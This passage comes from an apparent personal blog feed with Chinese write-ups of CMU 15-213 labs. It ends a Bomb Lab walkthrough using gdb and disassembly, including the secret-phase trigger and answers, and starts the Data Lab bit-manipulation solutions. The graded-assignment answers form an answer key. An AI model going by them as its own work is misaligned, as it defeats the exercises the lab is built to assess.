  401241:	c3                   	retq
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;根据反汇编可以看出&lt;code&gt;%rdi&lt;/code&gt;(&lt;code&gt;0x6030f0&lt;/code&gt;)和&lt;code&gt;%esi&lt;/code&gt;(输入的数值)是传入参数，&lt;code&gt;%eax&lt;/code&gt;是返回值。其中还包括了一次递归调用。&lt;code&gt;fun7&lt;/code&gt;的 C 语言实现如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;c&#34;&gt;int fun7()
&amp;#123;
    // rsp留出8个字节的空间
    if(rdi == 0) &amp;#123;
        // seg3
        eax = 0xffffffff
    &amp;#125;
    else &amp;#123;
        edx = *rdi
        if(edx &amp;lt;= esi) &amp;#123;
            // seg2
            eax = 0
            if(edx != esi) &amp;#123;
                rdi = *(rdi + 16)
                call fun7
                eax = 2 * rax + 1
            &amp;#125;
        &amp;#125;
        else &amp;#123;
            rdi = *(rdi + 8)
            call fun7
            eax = eax * 2
        &amp;#125;
    &amp;#125;
    // seg4
    // rsp栈空间恢复
    return eax;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;fun7&lt;/code&gt;的内容翻译成 C 语言是如下内容：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;如果传入的&lt;code&gt;rdi = 0&lt;/code&gt;，那么返回&lt;code&gt;0xffffffff&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;否则，&lt;code&gt;edx&lt;/code&gt;的值为&lt;code&gt;rdi&lt;/code&gt;指向地址的值。&lt;/li&gt;
&lt;li&gt;如果&lt;code&gt;edx &amp;gt; 传入的esi&lt;/code&gt;，rdi 跳转到下一个位置（左节点的值）（这里大概率又是个链表），返回&lt;code&gt;2 * fun7()&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;否则，&lt;code&gt;eax = 0&lt;/code&gt;，如果&lt;code&gt;edx == 传入的esi&lt;/code&gt;，返回 0；否则就跳转到下下个位置（右节点的值），返回&lt;code&gt;2 * fun7() + 1&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;为什么能推测出来这里的左节点和右节点呢？我们在&lt;code&gt;0x6030f0&lt;/code&gt;打印 32 个字节的值看看：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) x/32bx 0x6030f0
0x6030f0 &amp;lt;n1&amp;gt;:          0x24    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x6030f8 &amp;lt;n1+8&amp;gt;:        0x10    0x31    0x60    0x00    0x00    0x00    0x00    0x00
0x603100 &amp;lt;n1+16&amp;gt;:       0x30    0x31    0x60    0x00    0x00    0x00    0x00    0x00
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里有 n+8 和 n+16，可以看出来这也是两个地址。&lt;/p&gt;
&lt;p&gt;这里对&lt;code&gt;fun7&lt;/code&gt;的要求是必须在传入地址的值为&lt;code&gt;0x6030f0&lt;/code&gt;，输入的&lt;code&gt;%esi &amp;lt;= 1000&lt;/code&gt;的情况下返回 2。&lt;/p&gt;
&lt;p&gt;我们打印一下这个链表各个结点的值：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) x/32bx 0x6030f0
0x6030f0 &amp;lt;n1&amp;gt;:          0x24    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x6030f8 &amp;lt;n1+8&amp;gt;:        0x10    0x31    0x60    0x00    0x00    0x00    0x00    0x00
0x603100 &amp;lt;n1+16&amp;gt;:       0x30    0x31    0x60    0x00    0x00    0x00    0x00    0x00
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;我们打印它左节点(node 21)：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) x/32bx 0x603110
0x603110 &amp;lt;n21&amp;gt;: 0x08    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x603118 &amp;lt;n21+8&amp;gt;:       0x90    0x31    0x60    0x00    0x00    0x00    0x00    0x00
0x603120 &amp;lt;n21+16&amp;gt;:      0x50    0x31    0x60    0x00    0x00    0x00    0x00    0x00
0x603128:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;再打印右节点(node 22)：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) x/32bx 0x603130
0x603130 &amp;lt;n22&amp;gt;: 0x32    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x603138 &amp;lt;n22+8&amp;gt;:       0x70    0x31    0x60    0x00    0x00    0x00    0x00    0x00
0x603140 &amp;lt;n22+16&amp;gt;:      0xb0    0x31    0x60    0x00    0x00    0x00    0x00    0x00
0x603148:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;现在的迷惑之处在于&lt;code&gt;fun7&lt;/code&gt;到底返回的是什么东西。从&lt;code&gt;fun7&lt;/code&gt;的内容来看，其主要目的是一直找到&lt;code&gt;esi&lt;/code&gt;的值在二叉树中的位置。如果&lt;code&gt;esi &amp;lt; edx&lt;/code&gt;，就找左边那颗二叉树，返回&lt;code&gt;2 * fun7()&lt;/code&gt;，否则就找右边那颗二叉树，返回&lt;code&gt;2 * fun7() + 1&lt;/code&gt;。从&lt;code&gt;0x6030f0&lt;/code&gt;这个位置开始找，最后&lt;code&gt;fun7()&lt;/code&gt;必须返回 2。从我们之前学习数据结构的经验来说，如果一个结点的标号为 n，那么它的左孩子就是 2 _ n,右孩子就是 2 _ n + 1。&lt;/p&gt;
&lt;p&gt;二叉树的结构如下：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/blog/2024/02/26/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Bomb%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/fun7.png&#34; alt=&#34;fun7&#34;&gt;&lt;/p&gt;
&lt;p&gt;那么首先&lt;code&gt;edx&lt;/code&gt;的值为根节点的地址，我们从根开始遍历，一直到&lt;code&gt;%esi&lt;/code&gt;的值所在的位置。我们对每个结点进行排查，那么能让最后返回 2 的&lt;code&gt;%esi&lt;/code&gt;只有 0x16 和 0x14。&lt;/p&gt;
&lt;p&gt;但是&lt;code&gt;secret_phase&lt;/code&gt;在哪里启动呢？我们来看看！欸，在&lt;code&gt;phase_defused&lt;/code&gt;中启动！我们看到在&lt;code&gt;callq secret_phase&lt;/code&gt;前有这样一段代码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;  401621:	bf 20 25 40 00       	mov    $0x402520,%edi
  401626:	e8 e5 f4 ff ff       	callq  400b10 &amp;lt;puts@plt&amp;gt;
  40162b:	b8 00 00 00 00       	mov    $0x0,%eax
  401630:	e8 0d fc ff ff       	callq  401242 &amp;lt;secret_phase&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这段汇编首先把一个看起来像地址的&lt;code&gt;0x402520&lt;/code&gt;放进了&lt;code&gt;%edi&lt;/code&gt;寄存器，然后调用&lt;code&gt;puts&lt;/code&gt;，将&lt;code&gt;eax&lt;/code&gt;设置为 0。我们来看看&lt;code&gt;0x402520&lt;/code&gt;处放了啥：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) x/s 0x402520
0x402520:       &amp;quot;But finding it and solving it are quite different...&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这个地址是否出现在别的地方呢？好像没有。但是这段代码后面还有一段：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;  401626:	e8 e5 f4 ff ff       	callq  400b10 &amp;lt;puts@plt&amp;gt;
  40162b:	b8 00 00 00 00       	mov    $0x0,%eax
  401630:	e8 0d fc ff ff       	callq  401242 &amp;lt;secret_phase&amp;gt;
  401635:	bf 58 25 40 00       	mov    $0x402558,%edi
  40163a:	e8 d1 f4 ff ff       	callq  400b10 &amp;lt;puts@plt&amp;gt;
  40163f:	48 8b 44 24 68       	mov    0x68(%rsp),%rax
  401644:	64 48 33 04 25 28 00 	xor    %fs:0x28,%rax
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里又出现了一个新地址，&lt;code&gt;0x402558&lt;/code&gt;，我们来看看这里是啥：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) x/s 0x402558
0x402558:       &amp;quot;Congratulations! You&amp;#39;ve defused the bomb!&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;额，是恭喜我们拆除炸弹。。。&lt;/p&gt;
&lt;p&gt;我想这么看可能是看不出来的，那么我们来把&lt;code&gt;phase_defused&lt;/code&gt;详细拆解看看(nop 指令省去)：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;00000000004015c4 &amp;lt;phase_defused&amp;gt;:
seg1:
  4015c4:	48 83 ec 78          	sub    $0x78,%rsp -&amp;gt; 留出栈位置
  4015c8:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
  4015cf:	00 00
  4015d1:	48 89 44 24 68       	mov    %rax,0x68(%rsp) -&amp;gt; *(rsp + 104) = rax
  4015d6:	31 c0                	xor    %eax,%eax -&amp;gt; 将eax置0
  4015d8:	83 3d 81 21 20 00 06 	cmpl   $0x6,0x202181(%rip)        # 603760 &amp;lt;num_input_strings&amp;gt;
  4015df:	75 5e                	jne    40163f &amp;lt;phase_defused+0x7b&amp;gt;
  4015e1:	4c 8d 44 24 10       	lea    0x10(%rsp),%r8
  4015e6:	48 8d 4c 24 0c       	lea    0xc(%rsp),%rcx
  4015eb:	48 8d 54 24 08       	lea    0x8(%rsp),%rdx
  4015f0:	be 19 26 40 00       	mov    $0x402619,%esi
  4015f5:	bf 70 38 60 00       	mov    $0x603870,%edi
  4015fa:	e8 f1 f5 ff ff       	callq  400bf0 &amp;lt;__isoc99_sscanf@plt&amp;gt;
  4015ff:	83 f8 03             	cmp    $0x3,%eax
  401602:	75 31                	jne    401635 &amp;lt;phase_defused+0x71&amp;gt;
  401604:	be 22 26 40 00       	mov    $0x402622,%esi
  401609:	48 8d 7c 24 10       	lea    0x10(%rsp),%rdi
  40160e:	e8 25 fd ff ff       	callq  401338 &amp;lt;strings_not_equal&amp;gt;
  401613:	85 c0                	test   %eax,%eax
  401615:	75 1e                	jne    401635 &amp;lt;phase_defused+0x71&amp;gt;
  401617:	bf f8 24 40 00       	mov    $0x4024f8,%edi
  40161c:	e8 ef f4 ff ff       	callq  400b10 &amp;lt;puts@plt&amp;gt;
  401621:	bf 20 25 40 00       	mov    $0x402520,%edi
  401626:	e8 e5 f4 ff ff       	callq  400b10 &amp;lt;puts@plt&amp;gt;
  40162b:	b8 00 00 00 00       	mov    $0x0,%eax
  401630:	e8 0d fc ff ff       	callq  401242 &amp;lt;secret_phase&amp;gt;
seg2:
  401635:	bf 58 25 40 00       	mov    $0x402558,%edi
  40163a:	e8 d1 f4 ff ff       	callq  400b10 &amp;lt;puts@plt&amp;gt;
seg3:
  40163f:	48 8b 44 24 68       	mov    0x68(%rsp),%rax
  401644:	64 48 33 04 25 28 00 	xor    %fs:0x28,%rax
  40164b:	00 00
  40164d:	74 05                	je     401654 &amp;lt;phase_defused+0x90&amp;gt;
  40164f:	e8 dc f4 ff ff       	callq  400b30 &amp;lt;__stack_chk_fail@plt&amp;gt;
seg4:
  401654:	48 83 c4 78          	add    $0x78,%rsp
  401658:	c3                   	retq
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;其中 seg 3 和 4 主要是一些收尾工作（检查&lt;code&gt;canary&lt;/code&gt;的值之类的），seg2 是打印恭喜字符串，其核心部分在 seg 1。&lt;/p&gt;
&lt;p&gt;seg 1 的工作如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;留出栈的位置，放置&lt;code&gt;canary&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;获取输入的字符串的个数，如果不等于 6，跳转到收尾工作&lt;/li&gt;
&lt;li&gt;设置以下几个值：&lt;pre&gt;&lt;code&gt; 4015e1:	4c 8d 44 24 10       	lea    0x10(%rsp),%r8 // r8 = rsp + 16
 4015e6:	48 8d 4c 24 0c       	lea    0xc(%rsp),%rcx // rcx = rsp + 12
 4015eb:	48 8d 54 24 08       	lea    0x8(%rsp),%rdx // rdx = rsp + 8
 4015f0:	be 19 26 40 00       	mov    $0x402619,%esi // esi = 0x402619
 4015f5:	bf 70 38 60 00       	mov    $0x603870,%edi // edi = 0x603870
&lt;/code&gt;&lt;/pre&gt;
这里&lt;code&gt;0x402619&lt;/code&gt;是&lt;code&gt;sscanf&lt;/code&gt;的格式化输入的字符串的保存地址：&lt;pre&gt;&lt;code&gt;0x402619:       &amp;quot;%d %d %s&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
而&lt;code&gt;0x603870&lt;/code&gt;是输入的字符串的保存地址：&lt;pre&gt;&lt;code&gt;(gdb) x/s 0x603870
 0x603870 &amp;lt;input_strings+240&amp;gt;:   &amp;quot;&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;调用 sscanf 获取输入字符串，其个数存储在&lt;code&gt;%eax&lt;/code&gt;中，判断其是否等于 3，如果不是进入收尾工作&lt;/li&gt;
&lt;li&gt;接下来我们需要判断&lt;code&gt;0x402622&lt;/code&gt;处的字符串和输入的字符串是否相等，该处的字符串为&lt;code&gt;DrEvil&lt;/code&gt;，如果相等的话，打印如下指令，然后进入 secret phase:&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;(gdb) x/s 0x4024f8
0x4024f8:       &amp;quot;Curses, you&amp;#39;ve found the secret phase!&amp;quot;
(gdb) x/s 0x402520
0x402520:       &amp;quot;But finding it and solving it are quite different...&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;但是什么时候会&lt;code&gt;sscanf&lt;/code&gt;到&lt;code&gt;0x603870&lt;/code&gt;处呢？只有&lt;code&gt;phase_3&lt;/code&gt;和&lt;code&gt;phase_4&lt;/code&gt;调用了&lt;code&gt;sscanf&lt;/code&gt;，且输入的字符串的地址都存储在&lt;code&gt;$rdi&lt;/code&gt;中，我们对他们打断点进行分析看看：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Breakpoint 1, 0x0000000000400f43 in phase_3 ()
(gdb) p $rdi
$1 = 6305824
(gdb) p /x $rdi
$2 = 0x603820
(gdb) n
Single stepping until exit from function phase_3,
which has no line number information.
main (argc=&amp;lt;optimized out&amp;gt;, argv=&amp;lt;optimized out&amp;gt;) at bomb.c:90
warning: Source file is more recent than executable.
90          /* I guess this is too easy so far.  Some more complex code will
(gdb)
91           * confuse people. */
(gdb)
Halfway there!
94          phase_defused();
(gdb)
0 207
95          printf(&amp;quot;Halfway there!\n&amp;quot;);
(gdb) n

Breakpoint 2, 0x000000000040100c in phase_4 ()
(gdb) p /x $rdi
$3 = 0x603870
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在&lt;code&gt;phase_4&lt;/code&gt;中&lt;code&gt;$rdi = 0x603870&lt;/code&gt;，这个字符串是在这里输入的！那么这里应该输入第三个字符串来触发 secret_phase，也就是&lt;code&gt;DrEvil&lt;/code&gt;，并且 secret phase 的答案是 0x16 和 0x14。&lt;/p&gt;
&lt;p&gt;最后成功啦！&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Welcome to my fiendish little bomb. You have 6 phases with
which to blow yourself up. Have a nice day!
Phase 1 defused. How about the next one?
That&amp;#39;s number 2.  Keep going!
Halfway there!
So you got that one.  Try this one.
Good work!  On to the next...
Curses, you&amp;#39;ve found the secret phase!
But finding it and solving it are quite different...
Wow! You&amp;#39;ve defused the secret stage!
Congratulations! You&amp;#39;ve defused the bomb!
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;总结&#34;&gt;&lt;a href=&#34;#总结&#34; class=&#34;headerlink&#34; title=&#34;总结&#34;&gt;&lt;/a&gt;总结&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;code&gt;Phase 1 - 3&lt;/code&gt; 还好&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Phase 3&lt;/code&gt;那个需要传入 10 进制数，而不是 16 进制，写答案的时候不要写错了&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Phase 4&lt;/code&gt;那个&lt;code&gt;func&lt;/code&gt;没看出来是啥，蒙了个&lt;code&gt;0 0&lt;/code&gt;过了，需要搞懂&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Phase 5&lt;/code&gt;一开始没想到给那几个 16 进制的值加偏移量，使其为合法的&lt;code&gt;ASCII码&lt;/code&gt;字符，是后来加查了 1 个题解晓得的。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Phase 6&lt;/code&gt;费大力气终于解决啦！当然我一开始没留意到是第&lt;code&gt;ecx&lt;/code&gt;个数的&lt;code&gt;rdx&lt;/code&gt;存储在地址数组的第&lt;code&gt;rsi&lt;/code&gt;位，所以还以为链表的结点都是顺序排列的。解除 phase6 的经历也告诉我，看见汇编不要一开始上来就将它转化成 C 语言，要首先根据跳转目标对其进行分段，用流程图分析他的跳转，然后再将其拆解为各个小的过程（拆解的过程中尽量把循环放在一起，控制一下过程的规模），一步步的分析他，不要一上来就看题解&amp;#x2F;暴力反汇编。而且要留意题意！比如第 5 题那个 ASCII 码字符，第 6 题要把顺序转化为&lt;code&gt;7 - 原来的值&lt;/code&gt;，这都是容易做错的地方。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;secret_phase&lt;/code&gt;顺利完结！二叉树的结构精妙极了！但是&lt;code&gt;secret_phase&lt;/code&gt;的入口不好找，因为输入的字符串都在&lt;code&gt;%rdi&lt;/code&gt;中，需要通过&lt;code&gt;gdb&lt;/code&gt;查看哪个 phase 的 rdi 寄存器的值 &amp;#x3D; 0x603870，这点很难。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;参考资料&#34;&gt;&lt;a href=&#34;#参考资料&#34; class=&#34;headerlink&#34; title=&#34;参考资料&#34;&gt;&lt;/a&gt;参考资料&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC80NTE2MjM1NzQ=&#34;&gt;手把手教你拆解 CSAPP 的 炸弹实验室 BombLab&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC81NjEwNjg0NDU=&#34;&gt;CSAPP bomblab 隐藏关卡 secret_phase 拆弹记录&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
        <updated>2024-02-26T08:49:00.000Z</updated>
    </entry>
    <entry>
        <id>https://salvely.github.io/blog/2024/02/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Data%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/</id>
        <title>15213 Lab 1-data lab 实验记录</title>
        <link rel="alternate" href="https://salvely.github.io/blog/2024/02/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Data%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
        <content type="html">&lt;p&gt;部分的题目我参考了一下网上的内容（出处已注明），其他的均为自己实现（有的题目的实现过程可能会有些繁琐），部分 dlc 检测出来可能会报些 error，但是 btest 均能过。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;没有 TA 可太难了！自己实现了一天多，终于苟完了。不算完美，但也能看吧。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;bitXor&#34;&gt;&lt;a href=&#34;#bitXor&#34; class=&#34;headerlink&#34; title=&#34;bitXor&#34;&gt;&lt;/a&gt;bitXor&lt;/h2&gt;&lt;pre&gt;&lt;code class=&#34;c&#34;&gt;/*
 * bitXor - x^y using only ~ and &amp;amp;
 *   Example: bitXor(4, 5) = 1
 *   Legal ops: ~ &amp;amp;
 *   Max ops: 14
 *   Rating: 1
 */
int bitXor(int x, int y)
&amp;#123;
   /**
    * x + y = ~( ~x &amp;amp; ~y)
    */
   return ~((~(x &amp;amp; ~y)) &amp;amp; (~(y &amp;amp; ~x)));
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;bitXor 要求我们使用位操作来实现&lt;code&gt;^&lt;/code&gt;运算符。根据运算定律我们知道: &lt;code&gt;a ^ b = (a &amp;amp; (~b)) | (b &amp;amp; (~a))&lt;/code&gt;。但是问题来了，我们这里不允许使用&lt;code&gt;|&lt;/code&gt;，只能用&lt;code&gt;~&lt;/code&gt;和&lt;code&gt;&amp;amp;&lt;/code&gt;。那么我们就必须使用这两个操作符来实现&lt;code&gt;|&lt;/code&gt;运算。&lt;br&gt;通过德摩根定律我们知道：&lt;code&gt;a | b = ~((~a) &amp;amp; (~b))&lt;/code&gt;。这不就解决问题了嘛，所以将这两个式子综合一下，最后的结果是&lt;code&gt;~((~(x &amp;amp; ~y)) &amp;amp; (~(y &amp;amp; ~x)))&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;tmin&#34;&gt;&lt;a href=&#34;#tmin&#34; class=&#34;headerlink&#34; title=&#34;tmin&#34;&gt;&lt;/a&gt;tmin&lt;/h2&gt;&lt;pre&gt;&lt;code class=&#34;c&#34;&gt;/*
 * tmin - return minimum two&amp;#39;s complement integer
 *   Legal ops: ! ~ &amp;amp; ^ | + &amp;lt;&amp;lt; &amp;gt;&amp;gt;
 *   Max ops: 4
 *   Rating: 1
 */
int tmin(void)
&amp;#123;
   /**
    * the most significant bit = 1, others = 0, so (1 &amp;lt;&amp;lt; 31)
    */
   return (1 &amp;lt;&amp;lt; 31);
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这题要求我们返回最小的补码整数，返回类型为&lt;code&gt;int&lt;/code&gt;。首先，在二进制补码表示中，最高位的权值为-1，其他位的权值为 1。因此，最小的补码整数 tmin 的最高位为 1，其他位为 0。而题目中&lt;code&gt;int&lt;/code&gt;类型为 32 位，因此只要返回&lt;code&gt;(1 &amp;lt;&amp;lt; 31)&lt;/code&gt;即可。&lt;/p&gt;
&lt;h2 id=&#34;isTmax&#34;&gt;&lt;a href=&#34;#isTmax&#34; class=&#34;headerlink&#34; title=&#34;isTmax&#34;&gt;&lt;/a&gt;isTmax&lt;/h2&gt;&lt;pre&gt;&lt;code class=&#34;c&#34;&gt;/*
 * isTmax - returns 1 if x is the maximum, two&amp;#39;s complement number,
 *     and 0 otherwise
 *   Legal ops: ! ~ &amp;amp; ^ | +
 *   Max ops: 10
 *   Rating: 1
 */
int isTmax(int x)
&amp;#123;
   /**
    * Tmax ^ Tmin = 0xffffffff, ~0xffffffff = 0x0, !0x0 = 0x1
    */
   // return !(~(x ^ (1 &amp;lt;&amp;lt; 31)));

   /**
    * ~Tmax = Tmin -&amp;gt; ~Tmin + 1 = Tmin 且 Tmin != 0
    */
   int num = ~x;
   return !(num ^ (~num + 1)) &amp;amp; !!num;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;tmax 是二进制补码中最大的数，通过分析这个数的特点，我们可以完成这道题目。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;该数除了最高位是 0 外，其他位均是 1。因此该数和(1&amp;lt;&amp;lt;31)（也就是 tmin）的亦或（或者和）为&lt;code&gt;0xffffffff&lt;/code&gt;。&lt;code&gt;0xffffffff&lt;/code&gt;按位取反得到&lt;code&gt;0x0&lt;/code&gt;，而&lt;code&gt;0x0&lt;/code&gt;按位取反得到&lt;code&gt;0x1&lt;/code&gt;。但是其他的数并没有这个特性。&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;c&#34;&gt;return !(~(x ^ (1 &amp;lt;&amp;lt; 31)));
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;该数取反后得到 tmin，tmin 的一个特点是 tmin 和 -tmin 的表示相同。因此两者亦或得到 0。还有一个树也有这样的特性，也就是 0。因此我们需要排除 0 的可能性。我们使用&lt;code&gt;&amp;amp;&lt;/code&gt;操作符来实现两种特性的叠加。我本没有想到该方法，是从这篇&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC82MTQxMjY3OTU=&#34;&gt;知乎帖子&lt;/span&gt;学习到的。&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;c&#34;&gt;int num = ~x;
return !(num ^ (~num + 1)) &amp;amp; !!num;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;但是题目不允许在该题中使用移位运算符，因此只能使用方法二。&lt;/p&gt;
&lt;h2 id=&#34;allOddBits&#34;&gt;&lt;a href=&#34;#allOddBits&#34; class=&#34;headerlink&#34; title=&#34;allOddBits&#34;&gt;&lt;/a&gt;allOddBits&lt;/h2&gt;&lt;pre&gt;&lt;code class=&#34;c&#34;&gt;/*
 * allOddBits - return 1 if all odd-numbered bits in word set to 1
 *   where bits are numbered from 0 (least significant) to 31 (most significant)
 *   Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1
 *   Legal ops: ! ~ &amp;amp; ^ | + &amp;lt;&amp;lt; &amp;gt;&amp;gt;
 *   Max ops: 12
 *   Rating: 2
 */
int allOddBits(int x)
&amp;#123;
   /**
    * tear the number into 4 parts, get rid of the other digits except 0xaa
    * if the results are all the same, then compare it with 0xaa, if there are the same, xor returns 0
    * otherwise not all odd bits in word set is set to 1
    */
   int first = (x &amp;gt;&amp;gt; 24) &amp;amp; 0xaa;
   int second = (x &amp;gt;&amp;gt; 16) &amp;amp; 0xaa;
   int third = (x &amp;gt;&amp;gt; 8) &amp;amp; 0xaa;
   int fourth = x &amp;amp; 0xaa;
   return !((first &amp;amp; second &amp;amp; third &amp;amp; fourth) ^ 0xaa);
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;对于单个字节的奇数位，我们可以使用&lt;code&gt;0xaa&lt;/code&gt;作为 mask。&lt;br&gt;本题目中我将位打成 4 个部分，每个部分与 mask 相与。如果每个奇数位都是 1 的话，四个部分的比较结果应该相同，都等于&lt;code&gt;0xaa&lt;/code&gt;，该值与&lt;code&gt;0xaa&lt;/code&gt;异或得到&lt;code&gt;0x0&lt;/code&gt;，取&lt;code&gt;!&lt;/code&gt;后得到&lt;code&gt;0x1&lt;/code&gt;。否则该值不为&lt;code&gt;0xaa&lt;/code&gt;，同&lt;code&gt;0xaa&lt;/code&gt;亦或得到其他非零值，取&lt;code&gt;!&lt;/code&gt;后得到&lt;code&gt;0x0&lt;/code&gt;。&lt;/p&gt;
&lt;h2 id=&#34;negate&#34;&gt;&lt;a href=&#34;#negate&#34; class=&#34;headerlink&#34; title=&#34;negate&#34;&gt;&lt;/a&gt;negate&lt;/h2&gt;&lt;pre&gt;&lt;code class=&#34;c&#34;&gt;/*
 * negate - return -x
 *   Example: negate(1) = -1.
 *   Legal ops: ! ~ &amp;amp; ^ | + &amp;lt;&amp;lt; &amp;gt;&amp;gt;
 *   Max ops: 5
 *   Rating: 2
 */
int negate(int x)
&amp;#123;
   return (~x + 1);
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;该题目中我们需要求解某个数的相反数。在课堂中我们学过，一个数和它相反数的和为 0。那么如何获得其相反数呢？以&lt;code&gt;x&lt;/code&gt;为例，我们知道&lt;code&gt;x + ~x = ~0&lt;/code&gt;，也就是全 f，然后&lt;code&gt;~0 + 1 = 0&lt;/code&gt;。因此，&lt;code&gt;-x&lt;/code&gt;的补码表示即为&lt;code&gt;~x + 1&lt;/code&gt;。&lt;/p&gt;
&lt;h2 id=&#34;isAsciiDigit&#34;&gt;&lt;a href=&#34;#isAsciiDigit&#34; class=&#34;headerlink&#34; title=&#34;isAsciiDigit&#34;&gt;&lt;/a&gt;isAsciiDigit&lt;/h2&gt;&lt;pre&gt;&lt;code class=&#34;c&#34;&gt;/*
 * isAsciiDigit - return 1 if 0x30 &amp;lt;= x &amp;lt;= 0x39 (ASCII codes for characters &amp;#39;0&amp;#39; to &amp;#39;9&amp;#39;)
 *   Example: isAsciiDigit(0x35) = 1.
 *            isAsciiDigit(0x3a) = 0.
 *            isAsciiDigit(0x05) = 0.
 *   Legal ops: ! ~ &amp;amp; ^ | + &amp;lt;&amp;lt; &amp;gt;&amp;gt;
 *   Max ops: 15
 *   Rating: 3
 */
int isAsciiDigit(int x)
&amp;#123;
   /**
    * least = (x &amp;amp; 0xf) - 0xa
    * if least &amp;gt; 0 (with 0 in most significant bit) then least = 0
    * else least = 1
    */
   int least = ((((x &amp;amp; 0xf) + (~0xa + 1)) &amp;gt;&amp;gt; 31) &amp;amp; 0x1);
   int second = !((x &amp;gt;&amp;gt; 4) ^ 0x3);
   return least &amp;amp; second;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
